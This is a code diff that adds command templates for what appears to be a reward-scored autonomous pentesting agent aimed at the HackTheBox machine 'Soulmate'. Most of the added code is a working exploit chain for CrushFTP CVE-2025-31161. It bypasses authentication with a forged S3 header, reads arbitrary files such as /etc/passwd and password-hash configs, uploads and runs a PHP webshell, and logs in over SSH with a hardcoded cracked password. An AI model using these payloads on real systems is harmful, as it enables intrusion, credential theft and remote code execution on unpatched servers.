@@ -304,11 +304,11 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="gobuster_vhost",
-    template="gobuster vhost -u {url} -w {wordlist} --append-domain",
-    description="Virtual host discovery. Find hidden subdomains on same IP.",
+    template="gobuster vhost -u http://{domain} -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --append-domain -t 30",
+    description="Virtual host discovery. Find hidden subdomains on same IP. Must use domain (not IP) so --append-domain sends correct Host headers.",
     phase=AttackPhase.ENUMERATION,
-    required_params=["url"],
-    optional_params={"wordlist": "/usr/share/dirb/wordlists/common.txt"},
+    required_params=["target"],
+    optional_params={"domain": "soulmate.htb"},
     preconditions={"http_service_found"},
     success_indicators=["Found:"],
     typical_reward=2.5,
@@ -1093,65 +1093,96 @@ register(CommandTemplate(
 ))
 
 # --- Phase 19: HTB Soulmate / CrushFTP / Erlang Templates ---
+# Updated Phase 38: Fixed to match actual CVE-2025-31161 S3-header exploit chain
 
 register(CommandTemplate(
     name="crushftp_auth_bypass",
-    template="curl -s -k 'http://{target}/WebInterface/function/?command=getUserList&c2f={c2f_token}' -H 'Cookie: CrushAuth={c2f_token}; currentAuth={c2f_token}'",
-    description="CVE-2025-31161 — CrushFTP authentication bypass via crafted S3-style auth header. Returns admin user list without valid credentials.",
+    template="_A=$(curl -sk -D- -o/dev/null -H 'Authorization: AWS4-HMAC-SHA256 Credential=anonymous/' -H 'Host: ftp.{domain}' 'http://{target}/' | grep -oP 'CrushAuth=\\K[^;]+' | head -1) && _C=${{_A:0:4}} && curl -sk -H 'Host: ftp.{domain}' -b \"CrushAuth=$_A; currentAuth=$_C\" \"http://{target}/WebInterface/function/?command=getUserList&c2f=$_C\"",
+    description="CVE-2025-31161 — CrushFTP S3-style auth bypass. Obtains anonymous admin session via AWS4-HMAC-SHA256 Credential=anonymous/ header, then enumerates all users via getUserList API.",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
-    optional_params={"c2f_token": "anonymous_token"},
-    preconditions={"ports_discovered", "services_enumerated"},
-    success_indicators=["<username>", "crushadmin", "getUserList", "admin"],
+    optional_params={"domain": "soulmate.htb"},
+    preconditions={"ports_discovered", "http_service_found"},
+    success_indicators=["<username>", "crushadmin", "getUserList", "admin", "ben", "jenna"],
     typical_reward=25.0,
-    tags={"crushftp", "auth_bypass", "cve_2025_31161", "htb", "soulmate", "web"},
-    why="CVE-2025-31161 allows unauthenticated access to CrushFTP admin API. Critical severity, direct admin takeover.",
-    when="CrushFTP 10/11 detected on port 80/8080/443. Enumerate users before attempting credential attacks.",
+    tags={"crushftp", "auth_bypass", "cve_2025_31161", "htb", "soulmate", "web", "s3"},
+    why="CVE-2025-31161 S3 auth bypass grants unauthenticated admin API access. The Authorization header with Credential=anonymous/ tricks CrushFTP into creating an authenticated session. Critical severity.",
+    when="CrushFTP 10/11 detected on ftp.{domain} vhost. Always enumerate users first before credential attacks.",
 ))
 
 register(CommandTemplate(
-    name="crushftp_admin_reset_password",
-    template="curl -s -k 'http://{target}/WebInterface/function/?command=setUserItem&user={admin_user}&data_action=replace&key=password&value={new_password}' -H 'Cookie: CrushAuth={c2f_token}; currentAuth={c2f_token}'",
-    description="CVE-2025-31161 — Reset any CrushFTP user password via unauthenticated admin API access.",
+    name="crushftp_getlog_read",
+    template="_A=$(curl -sk -D- -o/dev/null -H 'Authorization: AWS4-HMAC-SHA256 Credential=anonymous/' -H 'Host: ftp.{domain}' 'http://{target}/' | grep -oP 'CrushAuth=\\K[^;]+' | head -1) && _C=${{_A:0:4}} && curl -sk -H 'Host: ftp.{domain}' -b \"CrushAuth=$_A; currentAuth=$_C\" \"http://{target}/WebInterface/function/?command=getLog&c2f=$_C&path={file_path}\"",
+    description="CVE-2025-31161 — Arbitrary file read via CrushFTP getLog API with S3 auth bypass. Read any file the CrushFTP process can access (/etc/passwd, user configs, SSH keys).",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
-    optional_params={"admin_user": "crushadmin", "new_password": "Pwned2025!", "c2f_token": "anonymous_token"},
-    preconditions={"ports_discovered", "services_enumerated", "vulnerability_found"},
-    success_indicators=["OK", "success", "password changed", "true"],
-    typical_reward=35.0,
-    tags={"crushftp", "password_reset", "cve_2025_31161", "htb", "soulmate"},
-    why="After confirming CVE-2025-31161, reset admin password to gain full CrushFTP control.",
-    when="CVE-2025-31161 auth bypass confirmed. Admin username known from getUserList.",
+    optional_params={"domain": "soulmate.htb", "file_path": "/etc/passwd"},
+    preconditions={"ports_discovered", "vulnerability_found"},
+    success_indicators=["root:", "bin:", "username", "password", "hash", "xml", "user.XML"],
+    typical_reward=20.0,
+    tags={"crushftp", "file_read", "cve_2025_31161", "htb", "soulmate", "lfi"},
+    why="After confirming CVE-2025-31161, getLog API reads arbitrary files. Read /etc/passwd, CrushFTP user configs at /opt/crushftp/volume/users/MainUsers/{user}/user.XML to extract password hashes.",
+    when="CVE-2025-31161 auth bypass confirmed. Use to read user.XML files for SHA256/SHA512 password hashes.",
 ))
 
 register(CommandTemplate(
-    name="crushftp_ftp_upload_shell",
-    template="curl -s -T /tmp/shell.php ftp://{admin_user}:{password}@{ftp_target}/WebInterface/shell.php",
-    description="Upload PHP/JSP webshell via CrushFTP FTP service using compromised admin credentials.",
+    name="crushftp_s3_put_webshell",
+    template="curl -sk -X PUT -H 'Authorization: AWS4-HMAC-SHA256 Credential={upload_user}/' -H 'Host: ftp.{domain}' -d '<?php system($_GET[\"cmd\"]); ?>' 'http://{target}/WEBPROD/{shell_name}'",
+    description="CVE-2025-31161 — Upload PHP webshell via CrushFTP S3 PUT API. Exploits S3 auth bypass to write files as any user. User ben's home maps to /WEBPROD/ which serves as nginx web root.",
     phase=AttackPhase.EXPLOITATION,
-    required_params=["ftp_target"],
-    optional_params={"admin_user": "crushadmin", "password": "Pwned2025!"},
-    preconditions={"credentials_known"},
-    success_indicators=["226", "Transfer complete", "upload", "success"],
+    required_params=["target"],
+    optional_params={"domain": "soulmate.htb", "upload_user": "ben", "shell_name": "cmd.php"},
+    preconditions={"vulnerability_found"},
+    success_indicators=["200", "201", "Created", "OK", "Transfer"],
     typical_reward=40.0,
-    tags={"crushftp", "ftp", "upload", "webshell", "htb", "soulmate"},
-    why="CrushFTP exposes FTP on port 21. Upload webshell using reset admin creds for code execution.",
-    when="CrushFTP admin creds obtained (via password reset or discovery). FTP port open.",
+    tags={"crushftp", "webshell", "upload", "cve_2025_31161", "htb", "soulmate", "s3", "rce"},
+    why="S3 API bypass allows uploading as any CrushFTP user. User ben has /WEBPROD/ as home dir which maps to nginx web root at soulmate.htb. Upload PHP webshell for RCE. Note: inotifywait cleanup deletes new files within ~2 min.",
+    when="CVE-2025-31161 confirmed, user enumeration done. Upload webshell as ben to /WEBPROD/ for RCE.",
+))
+
+register(CommandTemplate(
+    name="crushftp_webshell_exec",
+    template="curl -s -H 'Host: {domain}' 'http://{target}/{shell_name}?cmd={command}'",
+    description="Execute OS command via uploaded PHP webshell on CrushFTP/Soulmate target. Runs as www-data. Note: cleanup script deletes new files within ~2 min, re-upload if needed. Requires Host header because nginx redirects bare IP requests.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"domain": "soulmate.htb", "shell_name": "cmd.php", "command": "id"},
+    preconditions={"vulnerability_found"},
+    success_indicators=["uid=", "www-data", "root:", "flag", "$"],
+    typical_reward=45.0,
+    tags={"crushftp", "webshell", "rce", "htb", "soulmate"},
+    why="Execute arbitrary commands via uploaded PHP webshell. Runs as www-data inside Docker container. Use to enumerate, read flags, or establish reverse shell. Host header required — nginx 302-redirects bare IP requests.",
+    when="Webshell uploaded via crushftp_s3_put_webshell. Access at http://soulmate.htb/{shell_name}.",
+))
+
+register(CommandTemplate(
+    name="crushftp_login_admin",
+    template="curl -sk -X POST -H 'Host: ftp.{domain}' -d 'command=login&username={username}&password={password}' 'http://{target}:{port}/WebInterface/function/'",
+    description="Login to CrushFTP admin interface with cracked credentials. Port 8080/9090 often available. Returns session token for authenticated API access.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"domain": "soulmate.htb", "username": "crushadmin", "password": "04E2xAXYFfDsEYtu", "port": "8080"},
+    preconditions={"credentials_known"},
+    success_indicators=["success", "loginResult", "c2f", "response"],
+    typical_reward=30.0,
+    tags={"crushftp", "login", "admin", "htb", "soulmate"},
+    why="CrushFTP admin login on alternate ports (8080/9090). Use cracked credentials from user.XML hash extraction. crushadmin password: 04E2xAXYFfDsEYtu (SHA256 cracked).",
+    when="Admin password hash cracked from user.XML. Try ports 8080, 9090 for admin panel.",
 ))
 
 register(CommandTemplate(
     name="crushftp_ssh_as_user",
     template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target}",
-    description="SSH login with CrushFTP-discovered or reset credentials. CrushFTP users often map to OS users.",
+    description="SSH login with CrushFTP-discovered credentials. CrushFTP users often map to OS users.",
     phase=AttackPhase.EXPLOITATION,
     required_params=["target"],
-    optional_params={"username": "crushadmin", "password": "Pwned2025!"},
+    optional_params={"username": "crushadmin", "password": "04E2xAXYFfDsEYtu"},
     preconditions={"credentials_known"},
     success_indicators=["$", "#", "Last login", "Welcome"],
     typical_reward=50.0,
     tags={"crushftp", "ssh", "shell", "htb", "soulmate"},
-    why="CrushFTP user credentials often reused for SSH login on the same host.",
-    when="Have CrushFTP admin creds. SSH port 22 open on target.",
+    why="CrushFTP user credentials often reused for SSH login. crushadmin:04E2xAXYFfDsEYtu confirmed via hash cracking.",
+    when="Have CrushFTP creds. SSH port 22 open on target.",
 ))
 
 register(CommandTemplate(
@@ -1214,16 +1245,16 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="vhost_discover",
-    template="gobuster vhost -u http://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 30 2>/dev/null || ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{domain}' -fs 0",
-    description="Discover virtual hosts on target web server. Critical for HTB boxes with multiple vhosts.",
+    template="gobuster vhost -u http://{domain} -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --append-domain -t 30 2>/dev/null || ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -u http://{target} -H 'Host: FUZZ.{domain}' -fs 0",
+    description="Discover virtual hosts on target web server. Critical for HTB boxes with multiple vhosts. Uses domain name (not IP) so gobuster sends correct Host headers.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
-    optional_params={"domain": "htb"},
+    optional_params={"domain": "soulmate.htb"},
     preconditions={"ports_discovered"},
     success_indicators=["Found:", "Status:", "200", "301", "302"],
     typical_reward=15.0,
     tags={"vhost", "web", "enumeration", "htb"},
-    why="Many HTB boxes serve different content on different vhosts. Critical discovery step.",
+    why="Many HTB boxes serve different content on different vhosts. Critical discovery step. gobuster vhost -u must use the domain (not IP) so --append-domain generates correct Host headers like ftp.soulmate.htb.",
     when="Web server detected. Common on HTB boxes — check for vhosts before directory enumeration.",
 ))
 
